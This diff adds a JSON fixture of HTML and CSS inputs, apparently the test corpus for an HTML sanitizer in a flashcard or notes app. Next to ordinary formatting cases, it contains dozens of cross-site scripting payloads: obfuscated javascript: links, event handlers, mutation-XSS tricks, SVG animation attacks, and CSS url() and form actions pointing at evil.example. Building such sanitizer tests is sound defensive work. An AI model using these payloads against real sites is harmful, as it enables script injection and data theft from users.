@@ -1,0 +1,765 @@
+{
+  "html": [
+    {
+      "id": "plain",
+      "html": "Hola mundo"
+    },
+    {
+      "id": "bold",
+      "html": "<b>negrita</b> y <strong>fuerte</strong>"
+    },
+    {
+      "id": "inline-marks",
+      "html": "<i>a</i> <em>b</em> <u>c</u> <s>d</s> <del>e</del> <ins>f</ins>"
+    },
+    {
+      "id": "paragraphs",
+      "html": "<p>Uno</p><p>Dos</p>"
+    },
+    {
+      "id": "br-variants",
+      "html": "a<br>b<br/>c<BR />d"
+    },
+    {
+      "id": "anki-divs",
+      "html": "<div>Primera línea</div><div>Segunda</div>"
+    },
+    {
+      "id": "list",
+      "html": "<ul><li>Uno</li><li>Dos <b>tres</b></li></ul>"
+    },
+    {
+      "id": "ordered-list",
+      "html": "<ol start=\"3\" type=\"a\"><li>x</li><li>y</li></ol>"
+    },
+    {
+      "id": "definition-list",
+      "html": "<dl><dt>Término</dt><dd>Definición</dd></dl>"
+    },
+    {
+      "id": "table",
+      "html": "<table border=\"1\" cellpadding=\"2\" cellspacing=\"0\" width=\"100%\" align=\"center\"><caption>Tabla</caption><colgroup><col span=\"2\" width=\"50\"></colgroup><thead><tr><th colspan=\"2\" style=\"text-align: center\">Título</th></tr></thead><tbody><tr><td rowspan=\"2\" valign=\"top\" style=\"text-align:left\">a</td><td style=\"text-align: justify\">b</td></tr></tbody><tfoot><tr><td>pie</td></tr></tfoot></table>"
+    },
+    {
+      "id": "img-local",
+      "html": "<img src=\"a.png\">"
+    },
+    {
+      "id": "img-attributes",
+      "html": "<img src=\"b c.png\" alt=\"Corte &quot;axial&quot;\" width=\"200\" height=\"100\" style=\"max-width: 50%\">"
+    },
+    {
+      "id": "img-unicode-name",
+      "html": "<img src=\"img/ü.jpg\">"
+    },
+    {
+      "id": "img-missing",
+      "html": "<img src=\"nope.png\">"
+    },
+    {
+      "id": "img-remote",
+      "html": "<img src=\"https://example.org/x.png\">"
+    },
+    {
+      "id": "img-protocol-relative",
+      "html": "<img src=\"//example.org/x.png\">"
+    },
+    {
+      "id": "img-own-data-media",
+      "html": "<img src=\"a.png\" data-media=\"cards/evil.webp\">"
+    },
+    {
+      "id": "img-data-media-only",
+      "html": "<img data-media=\"notes/a.webp\" alt=\"a\" loading=\"lazy\" decoding=\"async\">"
+    },
+    {
+      "id": "span-data-media",
+      "html": "<span data-media=\"cards/x.webp\">t</span>"
+    },
+    {
+      "id": "img-single-quotes",
+      "html": "<img src='a.png'> x"
+    },
+    {
+      "id": "img-unquoted-upper",
+      "html": "<IMG class=\"x\" SRC=b.png> x"
+    },
+    {
+      "id": "img-src-and-data-media",
+      "html": "<img src=\"c.png\" data-media=\"cards/c.webp\">"
+    },
+    {
+      "id": "img-srcset",
+      "html": "<img src=\"a.png\" srcset=\"https://evil.example/x.png 2x\">"
+    },
+    {
+      "id": "media-tags",
+      "html": "<video src=\"v.mp4\" poster=\"p.png\"></video><audio src=\"a.mp3\"></audio><source src=\"s.mp4\"><embed src=\"e.swf\">"
+    },
+    {
+      "id": "sub-sup",
+      "html": "H<sub>2</sub>O y x<sup>2</sup>; CO₂ y m²"
+    },
+    {
+      "id": "cloze-rendered",
+      "html": "<span class=\"cloze\" data-cloze=\"ATP\" data-ordinal=\"1\">[...]</span> y <span class=\"cloze-inactive\">ADP</span>"
+    },
+    {
+      "id": "cloze-raw",
+      "html": "{{c1::mitocondria::organelo}} produce {{c2::ATP}}"
+    },
+    {
+      "id": "anki-front-back",
+      "html": "<div class=\"front\">Tema</div><hr id=answer><div class=\"back\">Respuesta</div>"
+    },
+    {
+      "id": "anki-sound-type",
+      "html": "[sound:x.mp3] [[type:Front]] texto"
+    },
+    {
+      "id": "anki-occlusion",
+      "html": "<div id=\"image-occlusion-container\"><img src=\"a.png\"><canvas id=\"image-occlusion-canvas\" width=\"10\" height=\"10\"></canvas></div><div data-shape=\"rect\" data-left=\".1\" data-top=\".1\" data-width=\".2\" data-height=\".2\" data-ordinal=\"1\"></div>"
+    },
+    {
+      "id": "mathjax-inline",
+      "html": "\\(x^2 + y_1\\) y \\[\\frac{a}{b}\\]"
+    },
+    {
+      "id": "mathjax-script",
+      "html": "<script type=\"math/tex\">x^2</script>después"
+    },
+    {
+      "id": "style-inline",
+      "html": "<span style=\"color: red; font-weight: bold\">rojo</span>"
+    },
+    {
+      "id": "style-many",
+      "html": "<div style=\"background-color: #fff; margin: 0 auto; padding: 4px; border: 1px solid #ccc; text-align: center; font-family: 'Arial', sans-serif; line-height: 1.4\">x</div>"
+    },
+    {
+      "id": "style-unknown-property",
+      "html": "<div style=\"position: fixed; top: 0; left: 0; z-index: 9999; inset: 0\">tapa</div>"
+    },
+    {
+      "id": "style-on-table-cells",
+      "html": "<table><tr><th style=\"text-align: right; color: red\">a</th><td style=\"text-align: middle\">b</td></tr></table>"
+    },
+    {
+      "id": "classes",
+      "html": "<div class=\"callout callout-ojo\"><p class=\"figure-caption source\">x</p><span class=\"fixed inset-0 z-50 missing-image\">y</span></div>"
+    },
+    {
+      "id": "note-figure",
+      "html": "<figure class=\"figure side-right\" style=\"width: 40%\"><img data-media=\"notes/a.webp\" alt=\"a\" width=\"300\" height=\"200\" loading=\"lazy\" decoding=\"async\"><figcaption>Figura 1. <em>Corte</em> sagital</figcaption></figure>"
+    },
+    {
+      "id": "note-figure-bad-width",
+      "html": "<figure style=\"width: 1000px\">x</figure><figure style=\"width: 40%; height: 9px\">y</figure>"
+    },
+    {
+      "id": "headings",
+      "html": "<h1>H1</h1><h2 id=\"sec-1\" class=\"x\">Dos</h2><h3 id=\"a\">Tres</h3><h4>Cuatro</h4><h5>Cinco</h5><h6>Seis</h6>"
+    },
+    {
+      "id": "aside-section",
+      "html": "<aside class=\"callout-libro\"><section class=\"note-summary\">s</section></aside><article><header>h</header><footer>f</footer></article>"
+    },
+    {
+      "id": "code-pre",
+      "html": "<pre><code>if (a &lt; b) { return; }</code></pre> <kbd>Ctrl</kbd>"
+    },
+    {
+      "id": "quote-mark-small",
+      "html": "<blockquote>cita</blockquote><q>q</q><cite>c</cite><abbr title=\"adenosín trifosfato\">ATP</abbr><mark>m</mark><small>s</small><big>b</big>"
+    },
+    {
+      "id": "link-https",
+      "html": "<a href=\"https://example.org/a?b=c&amp;d=e\">enlace</a>"
+    },
+    {
+      "id": "link-http",
+      "html": "<a href=\"http://example.org\">http</a>"
+    },
+    {
+      "id": "link-relative",
+      "html": "<a href=\"/semesters/2/courses/x\">relativo</a>"
+    },
+    {
+      "id": "link-anchor",
+      "html": "<a href=\"#sec\">ancla</a> <a href=\"#\" class=\"hint\" draggable=\"false\">pista</a>"
+    },
+    {
+      "id": "link-mailto",
+      "html": "<a href=\"mailto:alguien@example.org\">correo</a>"
+    },
+    {
+      "id": "link-protocol-relative",
+      "html": "<a href=\"//example.org/x\">sin esquema</a>"
+    },
+    {
+      "id": "font-tag",
+      "html": "<font color=\"red\" face=\"Arial\" size=\"3\">viejo</font>"
+    },
+    {
+      "id": "center",
+      "html": "<center>centro</center>"
+    },
+    {
+      "id": "details",
+      "html": "<details open><summary>Más</summary>oculto</details>"
+    },
+    {
+      "id": "ruby",
+      "html": "<ruby>漢<rp>(</rp><rt>kan</rt><rp>)</rp></ruby>"
+    },
+    {
+      "id": "wbr-canvas",
+      "html": "pala<wbr>bra<canvas width=\"1\" height=\"1\"></canvas>"
+    },
+    {
+      "id": "entities-named",
+      "html": "a &amp; b &lt;c&gt; &quot;d&quot; &#39;e&#39; &apos;f&apos; &nbsp;g &aacute; &ntilde; &copy; &mdash;"
+    },
+    {
+      "id": "entities-numeric",
+      "html": "&#233; &#xE9; &#x1F600; &#0; &#xD800; &#1114112; &#65;"
+    },
+    {
+      "id": "entities-malformed",
+      "html": "&amp &nope; & ; &#; &#x; AT&T &ampx"
+    },
+    {
+      "id": "entities-unknown-name",
+      "html": "&nope; y &amp; &zzz;"
+    },
+    {
+      "id": "entities-unknown-after-known",
+      "html": "a &amp; b &nope; c"
+    },
+    {
+      "id": "entities-legacy-no-semicolon",
+      "html": "&copy 2026 &lt3 &aacute"
+    },
+    {
+      "id": "double-escaped",
+      "html": "&amp;lt;script&amp;gt; &amp;amp;"
+    },
+    {
+      "id": "nbsp-raw",
+      "html": "a b  c"
+    },
+    {
+      "id": "whitespace",
+      "html": "  a \n\t b \r\n c  "
+    },
+    {
+      "id": "loose-less-than",
+      "html": "p<0.05 y q>1 <b>z</b><!-- nota -->"
+    },
+    {
+      "id": "less-than-letters",
+      "html": "a<b c>d y 3<4"
+    },
+    {
+      "id": "comment",
+      "html": "a<!-- nota -->b"
+    },
+    {
+      "id": "comment-unclosed",
+      "html": "a<!-- sin cerrar b"
+    },
+    {
+      "id": "conditional-comment",
+      "html": "<!--[if IE]><script>alert(1)</script><![endif]-->x"
+    },
+    {
+      "id": "downlevel-revealed",
+      "html": "<![if !IE]><b>x</b><![endif]>"
+    },
+    {
+      "id": "cdata",
+      "html": "<![CDATA[<script>alert(1)</script>]]>y"
+    },
+    {
+      "id": "doctype",
+      "html": "<!DOCTYPE html><html><head><title>t</title></head><body><p>x</p></body></html>"
+    },
+    {
+      "id": "processing-instruction",
+      "html": "<?xml version=\"1.0\"?><p>x</p>"
+    },
+    {
+      "id": "empty",
+      "html": ""
+    },
+    {
+      "id": "only-spaces",
+      "html": "   "
+    },
+    {
+      "id": "unicode",
+      "html": "Núcleo 🧬 — «comillas» ñ ü 漢字"
+    },
+    {
+      "id": "svg-chart",
+      "html": "<svg viewBox=\"0 0 200 100\" width=\"200\" height=\"100\" role=\"img\" aria-label=\"Gráfico\"><title>Curva</title><g transform=\"translate(10 0)\"><polyline points=\"0,90 50,40 100,60\" fill=\"none\" stroke=\"#2a7\" stroke-width=\"2\" stroke-dasharray=\"4 2\" stroke-linecap=\"round\"/><text x=\"10\" y=\"95\" font-size=\"8\" font-family=\"Inter\" text-anchor=\"start\" dominant-baseline=\"middle\">0</text><text x=\"100\" y=\"10\"><tspan dx=\"2\" dy=\"1\">Máx</tspan></text><path d=\"M0 0 L10 10 Z\" fill-rule=\"evenodd\" fill-opacity=\"0.5\"/><line x1=\"0\" y1=\"0\" x2=\"10\" y2=\"0\" stroke-opacity=\".3\"/><ellipse cx=\"1\" cy=\"1\" rx=\"1\" ry=\"2\"/><polygon points=\"0,0 1,1 0,1\"/><rect x=\"1\" y=\"1\" width=\"5\" height=\"5\" rx=\"1\" opacity=\"0.8\"/><circle cx=\"5\" cy=\"5\" r=\"4\" aria-hidden=\"true\"/></g></svg>"
+    },
+    {
+      "id": "svg-namespaces",
+      "html": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" viewBox=\"0 0 10 10\" preserveAspectRatio=\"xMidYMid meet\"><rect width=\"1\" height=\"1\"/></svg>"
+    },
+    {
+      "id": "svg-gradient",
+      "html": "<svg viewBox=\"0 0 1 1\"><defs><linearGradient id=\"g\"><stop offset=\"0\"/></linearGradient></defs><rect width=\"1\" height=\"1\" fill=\"url(#g)\"/></svg>"
+    },
+    {
+      "id": "svg-uppercase",
+      "html": "<SVG VIEWBOX=\"0 0 1 1\"><RECT WIDTH=\"1\"/></SVG>"
+    },
+    {
+      "id": "svg-self-closing",
+      "html": "<svg><text/><rect/><g/></svg>"
+    },
+    {
+      "id": "svg-style-attribute",
+      "html": "<svg><rect style=\"fill: red\" class=\"x\" id=\"r\" width=\"1\"/></svg>"
+    },
+    {
+      "id": "script",
+      "html": "<script>alert(1)</script>ok"
+    },
+    {
+      "id": "script-upper",
+      "html": "<SCRIPT>alert(1)</SCRIPT>ok"
+    },
+    {
+      "id": "script-mixed-case-src",
+      "html": "<ScRiPt src=//evil.example/x.js></sCrIpT>ok"
+    },
+    {
+      "id": "script-unclosed",
+      "html": "<script>alert(1)"
+    },
+    {
+      "id": "script-split",
+      "html": "<scr<script>ipt>alert(1)</script>"
+    },
+    {
+      "id": "script-inside-attribute",
+      "html": "<img src=\"a.png\" alt=\"</script><script>alert(1)</script>\">"
+    },
+    {
+      "id": "onerror",
+      "html": "<img src=\"a.png\" onerror=\"alert(1)\">"
+    },
+    {
+      "id": "onload-svg",
+      "html": "<svg onload=\"alert(1)\"><rect width=\"1\" height=\"1\"/></svg>"
+    },
+    {
+      "id": "onclick-upper",
+      "html": "<div OnClick=\"alert(1)\">x</div>"
+    },
+    {
+      "id": "onmouseover-unquoted",
+      "html": "<b onmouseover=alert(1)>x</b>"
+    },
+    {
+      "id": "on-without-space",
+      "html": "<img src=\"a.png\"/onerror=alert(1)>"
+    },
+    {
+      "id": "js-href",
+      "html": "<a href=\"javascript:alert(1)\">x</a>"
+    },
+    {
+      "id": "js-href-decimal-entities",
+      "html": "<a href=\"&#106;avascript:alert(1)\">x</a>"
+    },
+    {
+      "id": "js-href-hex-entities",
+      "html": "<a href=\"&#x6A;&#x61;vascript&#x3A;alert(1)\">x</a>"
+    },
+    {
+      "id": "js-href-named-entity",
+      "html": "<a href=\"javascript&colon;alert(1)\">x</a>"
+    },
+    {
+      "id": "js-href-tab",
+      "html": "<a href=\"java\tscript:alert(1)\">x</a>"
+    },
+    {
+      "id": "js-href-newline-entity",
+      "html": "<a href=\"java&#10;script:alert(1)\">x</a>"
+    },
+    {
+      "id": "js-href-leading-space",
+      "html": "<a href=\"  javascript:alert(1)\">x</a>"
+    },
+    {
+      "id": "js-href-mixed-case",
+      "html": "<a href=\"JaVaScRiPt:alert(1)\">x</a>"
+    },
+    {
+      "id": "js-href-null",
+      "html": "<a href=\"java\u0000script:alert(1)\">x</a>"
+    },
+    {
+      "id": "js-href-unquoted",
+      "html": "<a href=javascript:alert(1)>x</a>"
+    },
+    {
+      "id": "vbscript-href",
+      "html": "<a href=\"vbscript:msgbox(1)\">x</a>"
+    },
+    {
+      "id": "data-href",
+      "html": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>"
+    },
+    {
+      "id": "data-img",
+      "html": "<img src=\"data:image/svg+xml,&lt;svg onload=alert(1)&gt;\">"
+    },
+    {
+      "id": "js-img",
+      "html": "<img src=\"javascript:alert(1)\">"
+    },
+    {
+      "id": "style-url",
+      "html": "<span style=\"background: url(https://evil.example/x.png)\">x</span>"
+    },
+    {
+      "id": "style-url-newline",
+      "html": "<span style=\"background: red\nurl(https://evil.example/x.png)\">x</span>"
+    },
+    {
+      "id": "style-url-newline-entity",
+      "html": "<span style=\"background: red&#10;url(https://evil.example/x.png)\">x</span>"
+    },
+    {
+      "id": "style-url-carriage-return",
+      "html": "<span style=\"background: blue\rurl(https://evil.example/y.png)\">x</span>"
+    },
+    {
+      "id": "style-url-line-separator",
+      "html": "<span style=\"background: blue url(https://evil.example/y.png)\">x</span>"
+    },
+    {
+      "id": "style-url-comment-newline",
+      "html": "<span style=\"background: red/*\n*/url(https://evil.example/x.png)\">x</span>"
+    },
+    {
+      "id": "style-url-css-escape",
+      "html": "<span style=\"background: u\\72 l(https://evil.example/x.png)\">x</span>"
+    },
+    {
+      "id": "style-url-html-entity",
+      "html": "<span style=\"background: &#117;rl(https://evil.example/x.png)\">x</span>"
+    },
+    {
+      "id": "style-url-upper",
+      "html": "<span style=\"background: URL(https://evil.example/x.png)\">x</span>"
+    },
+    {
+      "id": "style-url-space",
+      "html": "<span style=\"background: url (x)\">x</span>"
+    },
+    {
+      "id": "style-expression",
+      "html": "<div style=\"width: expression(alert(1))\">x</div>"
+    },
+    {
+      "id": "style-javascript",
+      "html": "<div style=\"background: javascript:alert(1)\">x</div>"
+    },
+    {
+      "id": "style-import",
+      "html": "<div style=\"@import url(https://evil.example/x.css); color: red\">x</div>"
+    },
+    {
+      "id": "style-image-set",
+      "html": "<div style=\"background: image-set('x.png' 1x)\">x</div>"
+    },
+    {
+      "id": "style-webkit-image-set",
+      "html": "<div style=\"background: -webkit-image-set('https://evil.example/x.png' 1x)\">x</div>"
+    },
+    {
+      "id": "style-behavior-binding",
+      "html": "<div style=\"behavior: url(x.htc); -moz-binding: url(x.xml#y)\">x</div>"
+    },
+    {
+      "id": "style-brace-breakout",
+      "html": "<div style=\"color: red} body{background:url(x)\">x</div>"
+    },
+    {
+      "id": "style-quote-breakout",
+      "html": "<div style=\"font-family: &quot;a&quot;; color: red\">x</div>"
+    },
+    {
+      "id": "style-css-comment",
+      "html": "<div style=\"color: red/**/; background: u/**/rl(x)\">x</div>"
+    },
+    {
+      "id": "style-important",
+      "html": "<div style=\"color: red !important\">x</div>"
+    },
+    {
+      "id": "style-content",
+      "html": "<div style=\"content: 'x'\">x</div>"
+    },
+    {
+      "id": "style-display-none",
+      "html": "<div style=\"display: none; visibility: hidden; opacity: 0\">oculto</div>"
+    },
+    {
+      "id": "style-huge-margin",
+      "html": "<div style=\"margin: -9999px; width: 99999px\">x</div>"
+    },
+    {
+      "id": "style-element",
+      "html": "<div style=\"background: element(#a); background-image: paint(x)\">x</div>"
+    },
+    {
+      "id": "style-tag",
+      "html": "<style>body{background:red}</style>x"
+    },
+    {
+      "id": "style-tag-import",
+      "html": "<style>@import \"https://evil.example/x.css\";</style>x"
+    },
+    {
+      "id": "style-tag-after-text",
+      "html": "<p>a</p><style>:host{position:fixed;inset:0}</style>b"
+    },
+    {
+      "id": "style-tag-in-div",
+      "html": "<div><style>p{color:red}</style>x</div>"
+    },
+    {
+      "id": "link-stylesheet",
+      "html": "<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">x"
+    },
+    {
+      "id": "iframe",
+      "html": "<iframe src=\"https://evil.example\"></iframe>x"
+    },
+    {
+      "id": "iframe-srcdoc",
+      "html": "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>x"
+    },
+    {
+      "id": "object-embed",
+      "html": "<object data=\"x.swf\"></object><embed src=\"x.swf\">x"
+    },
+    {
+      "id": "form",
+      "html": "<form action=\"https://evil.example\"><input name=\"p\" type=\"password\"><button formaction=\"javascript:alert(1)\">ok</button></form>"
+    },
+    {
+      "id": "button-attributes",
+      "html": "<button type=\"submit\" onclick=\"alert(1)\" formaction=\"https://evil.example\">b</button>"
+    },
+    {
+      "id": "meta-refresh",
+      "html": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">x"
+    },
+    {
+      "id": "base",
+      "html": "<base href=\"https://evil.example/\">x"
+    },
+    {
+      "id": "svg-foreign-object",
+      "html": "<svg><foreignObject><div>html</div><script>alert(1)</script></foreignObject></svg>"
+    },
+    {
+      "id": "svg-use",
+      "html": "<svg><use href=\"https://evil.example/x.svg#a\"/><use xlink:href=\"#b\"/></svg>"
+    },
+    {
+      "id": "svg-animate",
+      "html": "<svg><a><animate attributeName=\"href\" values=\"javascript:alert(1)\"/><text x=\"1\" y=\"1\">t</text></a></svg>"
+    },
+    {
+      "id": "svg-set",
+      "html": "<svg><set attributeName=\"onmouseover\" to=\"alert(1)\"/></svg>"
+    },
+    {
+      "id": "svg-script",
+      "html": "<svg><script>alert(1)</script><rect width=\"1\"/></svg>"
+    },
+    {
+      "id": "svg-style-tag",
+      "html": "<svg><style>rect{fill:url(https://evil.example/x)}</style><rect width=\"1\"/></svg>"
+    },
+    {
+      "id": "svg-fill-url",
+      "html": "<svg><rect fill=\"url(https://evil.example/x)\" width=\"1\"/></svg>"
+    },
+    {
+      "id": "svg-fill-css-escape",
+      "html": "<svg><rect fill=\"u\\72 l(https://evil.example/x)\" width=\"1\"/></svg>"
+    },
+    {
+      "id": "svg-fill-html-entity",
+      "html": "<svg><rect fill=\"&#117;rl(https://evil.example/x)\" width=\"1\"/></svg>"
+    },
+    {
+      "id": "svg-fill-newline-url",
+      "html": "<svg><rect fill=\"red\nurl(https://evil.example/x)\" width=\"1\"/></svg>"
+    },
+    {
+      "id": "svg-transform-expression",
+      "html": "<svg><g transform=\"expression(alert(1))\"><rect width=\"1\"/></g></svg>"
+    },
+    {
+      "id": "svg-image",
+      "html": "<svg><image href=\"https://evil.example/x.png\"/></svg>"
+    },
+    {
+      "id": "svg-script-upper",
+      "html": "<svg><SCRIPT>alert(1)</SCRIPT></svg>"
+    },
+    {
+      "id": "math-annotation",
+      "html": "<math><mi>x</mi><annotation-xml encoding=\"text/html\"><script>alert(1)</script></annotation-xml></math>"
+    },
+    {
+      "id": "mxss-noscript",
+      "html": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>"
+    },
+    {
+      "id": "mxss-textarea",
+      "html": "<textarea><img src=x onerror=alert(1)></textarea>"
+    },
+    {
+      "id": "mxss-title",
+      "html": "<title><img src=x onerror=alert(1)></title>"
+    },
+    {
+      "id": "mxss-svg-style",
+      "html": "<svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\">"
+    },
+    {
+      "id": "unclosed-tags",
+      "html": "<b><i>sin cerrar<p>párrafo"
+    },
+    {
+      "id": "broken-nesting",
+      "html": "<b><i>a</b></i><table><tr><td>x</p></table>"
+    },
+    {
+      "id": "broken-attribute-quote",
+      "html": "<img src=\"a.png alt=x onerror=alert(1)>"
+    },
+    {
+      "id": "tag-without-end",
+      "html": "<img src=a.png onerror=alert(1)"
+    },
+    {
+      "id": "end-tags-with-spaces",
+      "html": "</ script>x</b >y"
+    },
+    {
+      "id": "null-byte-in-tag",
+      "html": "<scr\u0000ipt>alert(1)</scr\u0000ipt>"
+    },
+    {
+      "id": "null-byte-in-attribute-name",
+      "html": "<img src=\"a.png\" o\u0000nerror=\"alert(1)\">"
+    },
+    {
+      "id": "null-byte-in-text",
+      "html": "a\u0000b"
+    },
+    {
+      "id": "control-characters",
+      "html": "a\u0001\b\u000b\f\u001fb"
+    },
+    {
+      "id": "invisible-characters",
+      "html": "﻿a​b c d"
+    },
+    {
+      "id": "utf7",
+      "html": "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"
+    },
+    {
+      "id": "entity-smuggled-tag",
+      "html": "&lt;img src=x onerror=alert(1)&gt;"
+    },
+    {
+      "id": "entity-in-attribute",
+      "html": "<a href=\"https://example.org\" title=\"&lt;script&gt;\">t</a>"
+    },
+    {
+      "id": "id-clobbering",
+      "html": "<h2 id=\"__proto__\">a</h2><img name=\"cookie\" id=\"location\"><form id=\"x\"></form>"
+    },
+    {
+      "id": "data-and-aria",
+      "html": "<div data-x=\"1\" data-on-click=\"y\" aria-hidden=\"true\" role=\"button\" tabindex=\"0\">x</div>"
+    },
+    {
+      "id": "lang-dir-title",
+      "html": "<p lang=\"es\" dir=\"rtl\" title=\"t\">x</p>"
+    },
+    {
+      "id": "deep-nesting",
+      "html": "<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>x</div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>"
+    },
+    {
+      "id": "many-attributes",
+      "html": "<span a0=\"0\" a1=\"1\" a2=\"2\" a3=\"3\" a4=\"4\" a5=\"5\" a6=\"6\" a7=\"7\" a8=\"8\" a9=\"9\" a10=\"10\" a11=\"11\" a12=\"12\" a13=\"13\" a14=\"14\" a15=\"15\" a16=\"16\" a17=\"17\" a18=\"18\" a19=\"19\" a20=\"20\" a21=\"21\" a22=\"22\" a23=\"23\" a24=\"24\" a25=\"25\" a26=\"26\" a27=\"27\" a28=\"28\" a29=\"29\">x</span>"
+    }
+  ],
+  "css": [
+    "red",
+    "#fff",
+    "rgb(0, 0, 0)",
+    "1px solid #ccc",
+    "0 auto",
+    "bold",
+    "center",
+    "'Arial', sans-serif",
+    "calc(100% - 2px)",
+    "var(--x)",
+    "attr(data-x)",
+    "0.5",
+    "none",
+    "",
+    "  ",
+    "translate(1 1)",
+    "url(#g)",
+    "url(x)",
+    "URL(x)",
+    "url (x)",
+    "u\\72 l(x)",
+    "red\nurl(x)",
+    "red\rurl(x)",
+    "red url(x)",
+    "red url(x)",
+    "red/*\n*/url(x)",
+    "expression(alert(1))",
+    "EXPRESSION (x)",
+    "javascript:alert(1)",
+    "JavaScript:x",
+    "javascript\t:x",
+    "java\nscript:x",
+    "image-set('x' 1x)",
+    "-webkit-image-set('x' 1x)",
+    "image('x')",
+    "element(#a)",
+    "paint(x)",
+    "cross-fade(url(a), url(b))",
+    "src('x')",
+    "a\"b",
+    "a{b",
+    "a}b",
+    "a;b",
+    "a<b",
+    "a>b",
+    "a\\b",
+    "red\nblue"
+  ]
+}
